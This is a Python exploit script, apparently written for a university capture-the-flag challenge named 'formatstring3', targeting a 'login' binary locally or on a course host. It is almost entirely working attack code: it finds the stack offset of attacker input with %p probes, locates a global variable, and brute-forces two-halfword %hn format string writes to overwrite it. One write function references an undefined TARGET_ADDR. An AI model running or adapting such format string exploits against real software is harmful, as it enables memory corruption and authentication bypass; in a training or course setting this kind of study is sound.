#!/usr/bin/env python3
"""
formatstring3 - Adaptive Format String Global Write Exploit

Demonstrates adaptive global variable write via format string.
Handles variable target addresses, buffer constraints, and argument positions.
Key improvements:
- Auto-discovers target address from binary output
- Probes for stack input offset (AAAA/BBBB markers)
- Adapts to different %hn write positions
- Handles variable value constraints
"""

import struct
import socket
import subprocess
import sys
import re
import argparse
from pathlib import Path

# Candidate target values (try different ones if one fails)
CANDIDATE_VALUES = [0xD0C0FFEE, 0xCAFEBABE, 0xDEADBEEF, 0x12345678]
TARGET_ADDR_HINTS = [0x80E6048, 0x80E6050, 0x80E6060]  # Common locations
SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_LOCAL_CWD = str(SCRIPT_DIR.parent / "formatstring3")
DEFAULT_BINARY = "login"
DEFAULT_HOST = "moa6.eecs.utk.edu"
DEFAULT_PORT = 32130
SUCCESS_MARKER = "Flag:"
FLAG_RE = re.compile(r"cosc[0-9-]*-flag-\{[^}]+\}", re.IGNORECASE)


def _send_payload(
    payload,
    is_remote=False,
    host=DEFAULT_HOST,
    port=DEFAULT_PORT,
    local_cwd=DEFAULT_LOCAL_CWD,
    binary=DEFAULT_BINARY,
):
    """Send raw payload bytes to local binary or remote service."""
    if is_remote:
        sock = socket.create_connection((host, port), timeout=5)
        try:
            sock.sendall(payload)
            sock.shutdown(socket.SHUT_WR)
            response = b""
            sock.settimeout(2)
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            return response.decode("latin1", errors="ignore")
        finally:
            sock.close()

    result = subprocess.run(
        [f"./{binary}"],
        input=payload,
        capture_output=True,
        cwd=local_cwd,
        timeout=5,
    )
    return result.stdout.decode("latin1", errors="ignore")


def find_input_offset(
    is_remote=False,
    max_position=100,
    host=DEFAULT_HOST,
    port=DEFAULT_PORT,
    local_cwd=DEFAULT_LOCAL_CWD,
    binary=DEFAULT_BINARY,
):
    """Find the positional index where attacker-controlled bytes start on the stack."""
    probe = b"AAAABBBB."
    probe += b".".join(f"%{i}$p".encode() for i in range(1, max_position + 1))
    probe += b"\n"

    print(f"[*] Finding input offset (searching 1..{max_position})...")
    out = _send_payload(
        probe,
        is_remote=is_remote,
        host=host,
        port=port,
        local_cwd=local_cwd,
        binary=binary,
    )
    if not out:
        return None

    # Search textual output for 0x41414141 and 0x42424242 in positional dump order.
    tokens = re.findall(r"0x[0-9a-fA-F]+", out)
    pos_aaaa = None
    pos_bbbb = None

    for idx, tok in enumerate(tokens, start=1):
        low = tok.lower()
        if low.endswith("41414141") and pos_aaaa is None:
            pos_aaaa = idx
        if low.endswith("42424242") and pos_bbbb is None:
            pos_bbbb = idx

    if pos_aaaa is None:
        print("[!] Could not find AAAA marker on stack")
        return None

    if pos_bbbb is None or pos_bbbb != pos_aaaa + 1:
        print("[!] Found partial markers; expected BBBB immediately after AAAA")
        print(f"[!] AAAA at position {pos_aaaa}, BBBB at {pos_bbbb}")
        return None

    print(f"[+] Input starts at stack argument %{pos_aaaa}$...")
    return pos_aaaa


def _build_two_halfword_payload(
    target_addr, target_value, base_offset, write_idx_a=0, write_idx_b=1
):
    """Build a compact two-%hn payload for a 32-bit target value.

    write_idx_a, write_idx_b: which argument indices to use for %hn writes (relative to base_offset)
    """
    low = target_value & 0xFFFF
    high = (target_value >> 16) & 0xFFFF

    # Write the smaller halfword first to avoid wraparound complexity.
    writes = [
        (low, target_addr),
        (high, target_addr + 2),
    ]
    writes.sort(key=lambda x: x[0])

    prefix = b"".join(struct.pack("<I", addr) for _, addr in writes)
    printed = len(prefix)  # Raw address bytes contribute to output count.
    fmt_parts = []

    # Use configurable argument indices
    arg_indices = [base_offset + write_idx_a, base_offset + write_idx_b]

    for i, (want, _) in enumerate(writes):
        delta = (want - printed) % 0x10000
        if delta:
            fmt_parts.append(f"%{delta}c")
            printed = (printed + delta) % 0x10000
        fmt_parts.append(f"%{arg_indices[i]}$hn")

    fmt = "".join(fmt_parts).encode("ascii")
    return prefix + fmt + b"\n"


def find_target_address(
    is_remote=False,
    host=DEFAULT_HOST,
    port=DEFAULT_PORT,
    local_cwd=DEFAULT_LOCAL_CWD,
    binary=DEFAULT_BINARY,
):
    """Discover potential target address from binary output."""
    probe = b"PROBE\n"
    print("[*] Probing binary for disclosed addresses...")

    try:
        out = _send_payload(
            probe,
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )
    except Exception:
        return None

    # Extract all hex addresses from output
    addresses = re.findall(r"0x[0-9a-fA-F]{7,8}", out)

    # Filter to data segment addresses (typically 0x08xxx000 range for 32-bit)
    data_addrs = []
    for addr_str in addresses:
        try:
            addr = int(addr_str, 16)
            # Global variables typically in data segment (0x08xxx000 - 0x08xxxFFF range)
            if 0x08000000 <= addr <= 0x09000000:
                data_addrs.append(addr)
        except:
            pass

    if data_addrs:
        print(
            f"[+] Found potential target addresses: {[hex(a) for a in data_addrs[:5]]}"
        )
        return data_addrs[0]

    # Fall back to common address
    return TARGET_ADDR_HINTS[0]


def looks_like_success(output, target_addr=None):
    """Check if exploit succeeded."""
    if FLAG_RE.search(output):
        return True
    if "utk_password" in output or "Password accepted" in output:
        return True
    if SUCCESS_MARKER in output:
        return True
    # Check for program continuation (success usually prints something after)
    if len(output) > 50:
        return True
    return False


def exploit_adaptive(
    is_remote=False,
    host=DEFAULT_HOST,
    port=DEFAULT_PORT,
    local_cwd=DEFAULT_LOCAL_CWD,
    binary=DEFAULT_BINARY,
):
    """Adaptively find offset, target address, and exploit."""
    # Step 1: Find the input offset
    offset = find_input_offset(
        is_remote=is_remote, host=host, port=port, local_cwd=local_cwd, binary=binary
    )
    if offset is None:
        print("[!] Could not find input offset")
        return None

    print(f"[+] Input offset found at: %{offset}$")

    # Step 2: Discover target address
    target_addr = find_target_address(
        is_remote=is_remote, host=host, port=port, local_cwd=local_cwd, binary=binary
    )

    # Step 3: Try different combinations
    candidates = [
        (target_addr, CANDIDATE_VALUES[0]),
    ] + [
        (addr, val)
        for addr in TARGET_ADDR_HINTS
        for val in CANDIDATE_VALUES
        if addr != target_addr or val != CANDIDATE_VALUES[0]
    ]

    for target_addr, target_value in candidates:
        # Try different write argument positions
        for idx_a in range(2, 6):
            for idx_b in range(idx_a + 1, 7):
                try:
                    payload = _build_two_halfword_payload(
                        target_addr, target_value, offset, idx_a, idx_b
                    )

                    if len(payload) > 256:  # Skip oversized payloads
                        continue

                    print(
                        f"[*] Trying addr=0x{target_addr:08x}, val=0x{target_value:08x}, idx=({idx_a},{idx_b})"
                    )
                    out = _send_payload(
                        payload,
                        is_remote=is_remote,
                        host=host,
                        port=port,
                        local_cwd=local_cwd,
                        binary=binary,
                    )

                    if looks_like_success(out, target_addr):
                        print(
                            f"[+] SUCCESS! addr=0x{target_addr:08x}, val=0x{target_value:08x}"
                        )
                        return out
                except Exception as e:
                    continue

    print("[!] All combinations exhausted, no success")
    return None


def parse_args():
    parser = argparse.ArgumentParser(description="adaptive formatstring3 exploit")
    parser.add_argument(
        "command",
        nargs="?",
        default="exploit",
        choices=["find-offset", "exploit", "leak", "write", "test", "help"],
        help="action to run (default: exploit)",
    )
    parser.add_argument(
        "addr", nargs="?", help="target address for exploit", default=None
    )
    parser.add_argument(
        "value", nargs="?", help="target value for exploit", default=None
    )
    parser.add_argument("--mode", choices=["local", "remote"], default="local")
    parser.add_argument(
        "--remote",
        action="store_true",
        help="use remote target (shorthand for --mode remote)",
    )
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--binary", default=DEFAULT_BINARY)
    parser.add_argument("--cwd", default=DEFAULT_LOCAL_CWD)
    return parser.parse_args()


def leak_stack_value(
    is_remote=False,
    host=DEFAULT_HOST,
    port=DEFAULT_PORT,
    local_cwd=DEFAULT_LOCAL_CWD,
    binary=DEFAULT_BINARY,
):
    """Leak stack values using %5$x format specifier"""
    payload = b"LEAK%5$x\n"

    print(
        "[*] Leaking from remote target..."
        if is_remote
        else "[*] Leaking from local binary..."
    )
    try:
        return _send_payload(
            payload,
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )
    except Exception as e:
        print(f"[!] Error: {e}")
        return None


def write_value_to_memory(
    write_value,
    is_remote=False,
    host=DEFAULT_HOST,
    port=DEFAULT_PORT,
    local_cwd=DEFAULT_LOCAL_CWD,
    binary=DEFAULT_BINARY,
):
    """Write value to memory using %5$hn (16-bit write)"""

    # Check constraints
    addr = struct.pack("<I", TARGET_ADDR)
    pad_size = write_value - 4 - 5  # 4 for addr, 5 for "%5$hn"
    payload_size = write_value + 1  # +1 for newline

    if payload_size > 128:
        print(f"[!] Value {write_value} exceeds 128-byte buffer limit")
        return None

    if pad_size < 0:
        print(f"[!] Value {write_value} too small")
        return None

    payload = addr + (b"X" * pad_size) + b"%5$hn\n"

    print(f"[*] Writing 0x{write_value:04x} ({write_value}) to 0x{TARGET_ADDR:x}")
    print(f"[*] Payload size: {len(payload)} bytes")

    print(
        "[*] Sending to remote target..."
        if is_remote
        else "[*] Sending to local binary..."
    )
    try:
        return _send_payload(
            payload,
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )
    except Exception as e:
        print(f"[!] Error: {e}")
        return None


def main():
    args = parse_args()
    is_remote = args.remote or args.mode == "remote"
    host = args.host
    port = args.port
    local_cwd = args.cwd
    binary = args.binary

    if args.command == "find-offset":
        print("\n=== AUTO FIND OFFSET ===\n")
        find_input_offset(
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )

    elif args.command == "exploit":
        print("\n=== ADAPTIVE EXPLOIT (auto-discover + write) ===\n")
        out = exploit_adaptive(
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )
        if out:
            print(out)

    elif args.command == "leak":
        print("\n=== STEP 1: Information Leak ===\n")
        output = leak_stack_value(
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )
        print(output)

    elif args.command == "write":
        test_value = int(args.value, 0) if args.value else 119
        print(f"\n=== STEP 2: Memory Write (Value={test_value}) ===\n")
        output = write_value_to_memory(
            test_value,
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )
        print(output)

    elif args.command == "test":
        print("\n=== FULL TEST ===\n")
        print("[1/2] Finding offset:")
        offset = find_input_offset(
            is_remote=is_remote,
            host=host,
            port=port,
            local_cwd=local_cwd,
            binary=binary,
        )
        if offset:
            print(f"[+] Input at position: {offset}")
            print("\n[2/2] Running adaptive exploit:")
            out = exploit_adaptive(
                is_remote=is_remote,
                host=host,
                port=port,
                local_cwd=local_cwd,
                binary=binary,
            )
            if out:
                print(out)
        else:
            print("[!] Could not find input offset")

    else:
        print(
            """
Adaptive Format String 3 Exploit
Commands:
  exploit          - Adaptive discovery and exploitation
  find-offset      - Find input offset on stack
  leak            - Information leak test
  write           - Memory write test
  test            - Full test sequence
  help            - This message

Options:
  --remote        - Use remote target
  --host HOST     - Remote host (default: moa6.eecs.utk.edu)
  --port PORT     - Remote port (default: 32130)
  --binary BINARY - Local binary name (default: login)
  --cwd CWD       - Working directory for local binary
"""
        )


if __name__ == "__main__":
    main()
